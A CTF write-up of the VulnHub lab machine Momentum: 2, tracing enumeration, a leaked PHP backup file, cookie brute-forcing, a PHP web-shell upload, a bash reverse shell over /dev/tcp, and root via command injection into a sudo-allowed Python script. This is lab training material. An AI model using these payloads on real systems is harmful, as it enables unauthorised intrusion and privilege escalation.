---
title: "Momentum: 2 Writeup - Vulnhub"
date: 2023-09-01
categories: [Writeups, VulnHub]
tags: [Linux, Medium]
image:
  path: /assets/img/post/momentum2/momentum2.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: "Momentum: 2 Bannner"
---

## Skills:
-   Web Enumeration
-   Information Leakage - We find a backup file stored on the server
-   We create a specially designed request to ajax.php for uploading a file
-   Fuzzing Admin Cookie - BurpSuite Intruder Sniper Attack
-  Abusing Sudoers Privilege 

# Machine Info:
-   **OS** --> Linux
-   **IP** --> 192.168.1.9
-   **DIFFICULTY** --> Medium

-------------------------------------------------------------------------------

## 1. Scanning 

### Arp-scan
Find the victim machine on the network:

```bash
sudo arp-scan -I ens33 --localnet
```
### Nmap
We start our scanning with nmap:
```bash 
nmap -sS -sV -p- --open -n --min-rate 5000 -Pn -vvv 192.168.1.9 -oG Scan
```
### Nmap for versions
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:8C:1F:48 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It has 2 open ports, 22 and 80, since we do not have credentials to log in via ssh, go directly to port 80.

-------------------------------------------------------------------------------

## 2. Enumeration
In this we have a website.

![img](/assets/img/post/momentum2/page.png)

I'm going to look at the services running on this site.

```bash
❯ whatweb http://192.168.1.10
http://192.168.1.10 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.10], Title[Momentum 2 | Index]
```
We can also see in Wappalyzer, which uses php.

### Gobuster

list possible subdomains:

```bash
❯ gobuster dir -u http://192.168.1.10/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

We find several directories:

```bash 
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.10/img/]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.10/css/]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.10/manual/]
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.10/js/]
/owls                 (Status: 301) [Size: 311] [--> http://192.168.1.10/owls/]
/server-status        (Status: 403) [Size: 277]
```
After looking at each route, we have found a js file, which can give us some clues, it contains the following:

```javascript
function uploadFile() {

    var files = document.getElementById("file").files;
 
    if(files.length > 0 ){
 
       var formData = new FormData();
       formData.append("file", files[0]);
 
       var xhttp = new XMLHttpRequest();
 
       // Set POST method and ajax file path
       xhttp.open("POST", "ajax.php", true);
 
       // call on request changes state
       xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
 
            var response = this.responseText;
            if(response == 1){
               alert("Upload successfully.");
            }else{
               alert("File not uploaded.");
            }
          }
       };
 
       // Send request with data
       xhttp.send(formData);
 
    }else{
       alert("Please select a file");
    }
 
 }
```
If we analyze the code, we can see that the objective of this is to upload files.

Let's look for more possible subdomains, but now with the .html or .php format, we need to find where this upload function is applied.

```bash
gobuster dir -u http://192.168.1.10/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php
```

```bash
/.html                (Status: 403) [Size: 277]
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.10/img/]
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 1428]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.10/css/]
/ajax.php             (Status: 200) [Size: 0]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.10/manual/]
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.10/js/]
/dashboard.html       (Status: 200) [Size: 513]
/owls                 (Status: 301) [Size: 311] [--> http://192.168.1.10/owls/]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

a dashboard:

![img](/assets/img/post/momentum2/upload.png)

But in this one we can only upload .txt files.

Let's filter by more formats:

```bash
gobuster dir -u http://192.168.1.10/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.bak
```

```bash
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.10/img/]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.10/css/]
/ajax.php.bak         (Status: 200) [Size: 357]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.10/manual/]
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.10/js/]
/owls                 (Status: 301) [Size: 311] [--> http://192.168.1.10/owls/]
/server-status        (Status: 403) [Size: 277]
```
We find a backup file in ``php``, with curl we are going to see its contents:

```bash
curl -s -X GET "http://192.168.1.10/ajax.php.bak" | cat -l php
```

The file is the following:

```php

     //The boss told me to add one more Upper Case letter at the end of the cookie
    if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){
 
       //[+] Add if $_POST['secure'] == 'val1d'
         $valid_ext = array("pdf","php","txt");
    }
    else{
 
         $valid_ext = array("txt");
    }

// Remember success upload returns 1
```
Here we have several clues, the first comment tells us that the last letter of the administrator cookie is missing and that it is capitalized.

The value must return ``'val1d'`` for the request to succeed.

### Burpsuite
So let's intercept the request when uploading a file with burpsuite:

![img](/assets/img/post/momentum2/proxy.png)

We send it to the ``Repeater``:
![img](/assets/img/post/momentum2/req.png)

In principle we have this, when we send this request it returns the following:
![img](/assets/img/post/momentum2/res.png)

To let us upload files in php format, we have to meet the if condition.

We have to edit the request, so that it meets the requirements in the php.bak file that we saw previously, it says that the cookie has to be equal to ``admin=&G6u@B6uDXMq&Ms[unknown capital letter]``.

And it has to return the value val1d.

I already edited the request, it looks like this:
```bash
POST /ajax.php HTTP/1.1
Host: 192.168.1.10
Content-Length: 190
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvvNiH8PdjxlcglI6
Accept: */*
Origin: http://192.168.1.10
Referer: http://192.168.1.10/dashboard.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-US;q=0.8,es;q=0.7
Cookie: admin=&G6u@B6uDXMq&Ms
Connection: close

------WebKitFormBoundaryvvNiH8PdjxlcglI6
Content-Disposition: form-data; name="secure"

val1d           
------WebKitFormBoundaryvvNiH8PdjxlcglI6
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php


------WebKitFormBoundaryvvNiH8PdjxlcglI6--
```

Now we send it to the intruder.

Remember that the admin cookie is missing a capital letter, so we are going to fuzz it, testing it letter by letter until it returns 1.

![img](/assets/img/post/momentum2/a.png)

Let's load our payload:

![img](/assets/img/post/momentum2/pay.png)

This will test each letter we add, until we find the correct one, but to get the result we want, we must do the following:

![img](/assets/img/post/momentum2/b.png)

We begin the attack.

![img](/assets/img/post/momentum2/ata.png)

I see that the request with the letter ``R`` was successful, so we added it to the admin cookie.

### Revshell 
We take advantage and add our php code to generate a reverse shell.

```php
<?php 
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```
After sending this request, it returns ``"1"``, so the php file was uploaded successfully.

We go to the ``*/owls*`` directory on the website and here we can see the file.

![img](/assets/img/post/momentum2/owls.png)

We go to our php file and generate the revshell.

We listen:

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

And we launch revshell.

```
http://192.168.1.10/owls/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/443%200%3E%261%22
```
### Shell (www-data)
We already have access as www-data.

```bash
bash-5.0$ whoami
whoami
www-data
```
go to the home directory and the user athena.

Here is the user flag:

![img](/assets/img/post/momentum2/user.png)

-------------------------------------------------------------------------------

## 3. Elevar Privilegios

Within the same path we have another file.

```bash
bash-5.0$ ls 
ls
log.txt
password-reminder.txt
user.txt
```
contains this:

```bash
bash-5.0$ cat password-reminder.txt
cat password-reminder.txt
password : myvulnerableapp[Asterisk]
```
Let's try this password to log in as the athena user, replace [Asterisk] with a *.

We are already like Athena, let's do a ``sudo -l``:
```bash
sudo -l
```
```bash
Matching Defaults entries for athena on momentum2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User athena may run the following commands on momentum2:
    (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
```

We look at a python file, let's see what it contains:

```python
import random
import os
import subprocess

print('~ Random Cookie Generation ~')
print('[!] for security reasons we keep logs about cookie seeds.')
chars = '@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'

seed = input("Enter the seed : ")
random.seed = seed

cookie = ''
for c in range(20):
    cookie += random.choice(chars)

print(cookie)

cmd = "echo %s >> log.txt" % seed
subprocess.Popen(cmd, shell=True)
```
This is a snippet of Python code that generates a random cookie based on a seed provided by the user and then logs that seed to a log file called "log.txt" in the current working directory.

But we notice that at the end of the code we have a thread parameter, so we can run the program and pass the seed to it, then filter it with a ";" a shell command.
```bash
sudo python3 /home/team-tasks/cookie-gen.py
```
And we pass it the seed and the command that we want to filter in the input, it would look like this:

```bash
mhil4ne;chmod u+s /bin/bash
``` 
now we simply switch to bash, with the ``-p`` parameter

```bash
bash -p
```
With this we have root access to the victim machine, we locate the root flag in the /root directory.

```bash
cat root.txt
//                    \\
}  Rooted - Momentum 2 {
\\                    //

---------------------------------------------------
FLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
---------------------------------------------------
```
-------------------------------------------------------------------------------
